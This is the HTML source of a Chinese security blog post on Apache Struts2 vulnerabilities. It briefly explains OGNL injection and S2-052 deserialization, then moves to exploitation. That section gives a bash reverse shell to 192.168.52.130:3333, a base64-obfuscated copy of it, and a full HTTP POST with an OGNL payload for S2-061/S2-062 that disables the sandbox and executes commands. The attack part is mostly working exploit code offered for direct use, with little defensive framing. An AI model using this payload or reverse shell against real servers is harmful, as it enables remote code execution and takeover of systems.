@@ -1,0 +1,124 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Struts2 | 养猪日记</title>
+<meta name=keywords content><meta name=description content='一、Struts2
+Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。
+二、漏洞原理
+Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：
+@[类全名]@[方法名|值名]
+@java.lang.String@format(&lsquo;foo %s&rsquo;, &lsquo;bar&rsquo;)| APP_NAME；
+Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。
+S2-052漏洞
+这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。
+同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。
+三、漏洞特征
+.action   .do的请求路径
+四、漏洞利用
+S2-057 以下直接梭哈：Struts2_工具v18.09
+S2-061  S2-062
+编写反弹shell代码
+bash -i >& /dev/tcp/192.168.52.130/3333 0>&amp;1
+反弹shell涉及到管道符问题要将命令进行base64编码
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}
+POST /index.action HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 829
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+'><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Struts2"><meta property="og:description" content='一、Struts2
+Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。
+二、漏洞原理
+Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：
+@[类全名]@[方法名|值名]
+@java.lang.String@format(&lsquo;foo %s&rsquo;, &lsquo;bar&rsquo;)| APP_NAME；
+Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。
+S2-052漏洞
+这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。
+同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。
+三、漏洞特征
+.action   .do的请求路径
+四、漏洞利用
+S2-057 以下直接梭哈：Struts2_工具v18.09
+S2-061  S2-062
+编写反弹shell代码
+bash -i >& /dev/tcp/192.168.52.130/3333 0>&amp;1
+反弹shell涉及到管道符问题要将命令进行base64编码
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}
+POST /index.action HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 829
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+'><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Struts2"><meta name=twitter:description content='一、Struts2
+Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。
+二、漏洞原理
+Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：
+@[类全名]@[方法名|值名]
+@java.lang.String@format(&lsquo;foo %s&rsquo;, &lsquo;bar&rsquo;)| APP_NAME；
+Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。
+S2-052漏洞
+这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。
+同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。
+三、漏洞特征
+.action   .do的请求路径
+四、漏洞利用
+S2-057 以下直接梭哈：Struts2_工具v18.09
+S2-061  S2-062
+编写反弹shell代码
+bash -i >& /dev/tcp/192.168.52.130/3333 0>&amp;1
+反弹shell涉及到管道符问题要将命令进行base64编码
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}
+POST /index.action HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 829
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Struts2","item":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Struts2","name":"Struts2","description":"一、Struts2 Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。\n二、漏洞原理 Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：\n@[类全名]@[方法名|值名]\n@java.lang.String@format(\u0026lsquo;foo %s\u0026rsquo;, \u0026lsquo;bar\u0026rsquo;)| APP_NAME；\nStruts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。\nS2-052漏洞\n这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。\n同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。\n三、漏洞特征 .action .do的请求路径\n四、漏洞利用 S2-057 以下直接梭哈：Struts2_工具v18.09\nS2-061 S2-062\n编写反弹shell代码\nbash -i \u0026gt;\u0026amp; /dev/tcp/192.168.52.130/3333 0\u0026gt;\u0026amp;1\n反弹shell涉及到管道符问题要将命令进行base64编码\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\nPOST /index.action HTTP/1.1\rHost: localhost:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\rConnection: close\rContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\rContent-Length: 829\r------WebKitFormBoundaryl7d1B1aGsV2wcZwF\rContent-Disposition: form-data; name=\u0026#34;id\u0026#34;\r%{(#instancemanager=#application[\u0026#34;org.apache.tomcat.InstanceManager\u0026#34;]).(#stack=#attr[\u0026#34;com.opensymphony.xwork2.util.ValueStack.ValueStack\u0026#34;]).(#bean=#instancemanager.newInstance(\u0026#34;org.apache.commons.collections.BeanMap\u0026#34;)).(#bean.setBean(#stack)).(#context=#bean.get(\u0026#34;context\u0026#34;)).(#bean.setBean(#context)).(#macc=#bean.get(\u0026#34;memberAccess\u0026#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\u0026#34;java.util.HashSet\u0026#34;)).(#bean.put(\u0026#34;excludedClasses\u0026#34;,#emptyset)).(#bean.put(\u0026#34;excludedPackageNames\u0026#34;,#emptyset)).(#arglist=#instancemanager.newInstance(\u0026#34;java.util.ArrayList\u0026#34;)).(#arglist.add(\u0026#34;id\u0026#34;)).(#execute=#instancemanager.newInstance(\u0026#34;freemarker.template.utility.Execute\u0026#34;)).(#execute.exec(#arglist))}\r------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- ","keywords":[],"articleBody":"一、Struts2 Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。\n二、漏洞原理 Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：\n@[类全名]@[方法名|值名]\n@java.lang.String@format(‘foo %s’, ‘bar’)| APP_NAME；\nStruts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。\nS2-052漏洞\n这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。\n同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。\n三、漏洞特征 .action .do的请求路径\n四、漏洞利用 S2-057 以下直接梭哈：Struts2_工具v18.09\nS2-061 S2-062\n编写反弹shell代码\nbash -i \u003e\u0026 /dev/tcp/192.168.52.130/3333 0\u003e\u00261\n反弹shell涉及到管道符问题要将命令进行base64编码\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\nPOST /index.action HTTP/1.1\rHost: localhost:8080\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\rConnection: close\rContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\rContent-Length: 829\r------WebKitFormBoundaryl7d1B1aGsV2wcZwF\rContent-Disposition: form-data; name=\"id\"\r%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"id\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}\r------WebKitFormBoundaryl7d1B1aGsV2wcZwF-- ","wordCount":"76","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Struts2</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;76 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><h1 id=一struts2>一、Struts2<a hidden class=anchor aria-hidden=true href=#一struts2>#</a></h1><p>Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。</p><h1 id=二漏洞原理>二、漏洞原理<a hidden class=anchor aria-hidden=true href=#二漏洞原理>#</a></h1><p>Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：</p><p>@[类全名]@[方法名|值名]</p><p>@java.lang.String@format(&lsquo;foo %s&rsquo;, &lsquo;bar&rsquo;)| APP_NAME；</p><p>Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。</p><p>S2-052漏洞</p><p>这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。</p><p>同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。</p><h1 id=三漏洞特征>三、漏洞特征<a hidden class=anchor aria-hidden=true href=#三漏洞特征>#</a></h1><p>.action .do的请求路径</p><h1 id=四漏洞利用>四、漏洞利用<a hidden class=anchor aria-hidden=true href=#四漏洞利用>#</a></h1><p>S2-057 以下直接梭哈：Struts2_工具v18.09</p><p>S2-061 S2-062</p><p>编写反弹shell代码</p><p>bash -i >& /dev/tcp/192.168.52.130/3333 0>&amp;1</p><p>反弹shell涉及到管道符问题要将命令进行base64编码</p><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}</p><pre tabindex=0><code>POST /index.action HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 829
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name=&#34;id&#34;
+
+%{(#instancemanager=#application[&#34;org.apache.tomcat.InstanceManager&#34;]).(#stack=#attr[&#34;com.opensymphony.xwork2.util.ValueStack.ValueStack&#34;]).(#bean=#instancemanager.newInstance(&#34;org.apache.commons.collections.BeanMap&#34;)).(#bean.setBean(#stack)).(#context=#bean.get(&#34;context&#34;)).(#bean.setBean(#context)).(#macc=#bean.get(&#34;memberAccess&#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&#34;java.util.HashSet&#34;)).(#bean.put(&#34;excludedClasses&#34;,#emptyset)).(#bean.put(&#34;excludedPackageNames&#34;,#emptyset)).(#arglist=#instancemanager.newInstance(&#34;java.util.ArrayList&#34;)).(#arglist.add(&#34;id&#34;)).(#execute=#instancemanager.newInstance(&#34;freemarker.template.utility.Execute&#34;)).(#execute.exec(#arglist))}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
+</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/><span class=title>« Prev</span><br><span>Spring</span>
+</a><a class=next href=https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/><span class=title>Next »</span><br><span>Tomcat</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>
